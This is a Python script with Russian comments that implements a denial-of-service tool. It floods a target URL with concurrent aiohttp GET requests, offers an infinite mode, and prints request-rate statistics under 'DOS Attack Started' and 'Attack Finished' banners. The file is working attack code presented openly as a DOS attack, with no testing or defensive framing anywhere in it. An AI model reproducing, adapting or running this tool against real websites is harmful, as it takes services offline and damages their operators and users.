import asyncio
import aiohttp
import time
import sys
from colorama import init, Fore, Style

# Инициализация colorama для Windows
init(autoreset=True)


def print_info(msg: str, color: str = Fore.GREEN):
    """Вывод цветного сообщения."""
    print(f"{color}{msg}{Style.RESET_ALL}")


def print_header(title: str):
    """Вывод заголовка."""
    print(f"\n{Fore.CYAN}{'=' * 50}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{title:^50}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 50}{Style.RESET_ALL}\n")


async def sub_main(
    url: str,
    concurrency: int = 200,
    requests_limit: int = 0,
    batch_size: int = None,  # По умолчанию = concurrency
    is_inf: bool = False
):
    """
    Основная функция для DOS атаки.
    
    Args:
        url: URL целевого сайта
        concurrency: Количество одновременных запросов
        requests_limit: Ограничение общего числа запросов (0 = безлимит)
        batch_size: Размер батча для отображения прогресса (по умолчанию = concurrency)
        is_inf: Бесконечный режим (игнорирует requests_limit)
    """
    # По умолчанию batch_size равен concurrency
    if batch_size is None:
        batch_size = concurrency
    
    connector = aiohttp.TCPConnector(
        limit=concurrency,
        limit_per_host=concurrency,
        force_close=False,
        enable_cleanup_closed=True
    )
    
    async def check_site(session, target_url: str) -> tuple:
        """Проверка доступности сайта."""
        try:
            async with session.get(target_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                await response.read()
                return response.status, True
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return None, False
    
    async def run_attack():
        async with aiohttp.ClientSession(connector=connector) as session:
            # Вывод информации о запуске
            print_header("DOS Attack Started")
            print_info(f"Target: {url}", Fore.BLUE)
            print_info(f"Concurrency: {concurrency} requests per batch")
            
            if is_inf or requests_limit == 0:
                print_info("Mode: INFINITE", Fore.YELLOW)
            else:
                print_info(f"Mode: LIMITED to {requests_limit} requests", Fore.YELLOW)
            
            print_info("Press Ctrl+C to stop\n", Fore.YELLOW)
            
            # Инициализация счетчиков
            total_requests = 0
            total_errors = 0
            batch_start = time.time()
            batch_count = 0
            batch_errors = 0
            
            try:
                while True:
                    # Проверка лимита запросов
                    remaining = requests_limit - total_requests if requests_limit > 0 else concurrency
                    current_batch = min(concurrency, remaining) if requests_limit > 0 else concurrency
                    
                    if current_batch <= 0:
                        break
                    
                    # Выполнение запросов
                    tasks = [check_site(session, url) for _ in range(current_batch)]
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Подсчет результатов
                    for result in results:
                        if isinstance(result, Exception):
                            batch_errors += 1
                            total_errors += 1
                        elif result[0] is None:
                            batch_errors += 1
                            total_errors += 1
                    
                    batch_count += current_batch
                    total_requests += current_batch
                    
                    # Вывод прогресса каждый batch_size запросов
                    if batch_count >= batch_size:
                        elapsed = time.time() - batch_start
                        rps = batch_count / elapsed if elapsed > 0 else 0
                        success = batch_count - batch_errors
                        
                        # Формирование строки прогресса
                        progress_msg = (
                            f"{Fore.RED}{total_requests}{Style.RESET_ALL} requests | "
                            f"{Fore.BLUE}{rps:.1f}{Style.RESET_ALL} req/s | "
                            f"{Fore.MAGENTA}Errors: {batch_errors}{Style.RESET_ALL}"
                        )
                        print(progress_msg)
                        
                        # Сброс счетчиков батча
                        batch_start = time.time()
                        batch_count = 0
                        batch_errors = 0
                    
                    # Остановка если достигнут лимит
                    if not is_inf and requests_limit > 0 and total_requests >= requests_limit:
                        break
                        
            except KeyboardInterrupt:
                pass
            
            # Итоговый отчет
            print_header("Attack Finished")
            print_info(f"Total Requests: {total_requests}", Fore.RED)
            print_info(f"Successful: {total_requests - total_errors}", Fore.GREEN)
            print_info(f"Errors: {total_errors}", Fore.YELLOW)
            
            elapsed = time.time() - batch_start if total_requests > 0 else 0
            if elapsed > 0:
                avg_rps = total_requests / elapsed
                print_info(f"Average Speed: {avg_rps:.1f} req/s", Fore.CYAN)
            
            return total_requests, total_errors
    
    return await run_attack()


def main(url: str, concurrency: int = 200, requests_limit: int = 0, is_inf: bool = False):
    """Точка входа в программу."""
    try:
        asyncio.run(sub_main(
            url=url,
            concurrency=concurrency,
            requests_limit=requests_limit,
            is_inf=is_inf
        ))
    except KeyboardInterrupt:
        print_info("\nStopped by user", Fore.YELLOW)
    except Exception as e:
        print_info(f"Error: {e}", Fore.RED)
        import traceback
        traceback.print_exc()


def use(req_per_con: int, is_inf: str, url: str):
    main(url, 
         concurrency=req_per_con, 
         is_inf=is_inf)
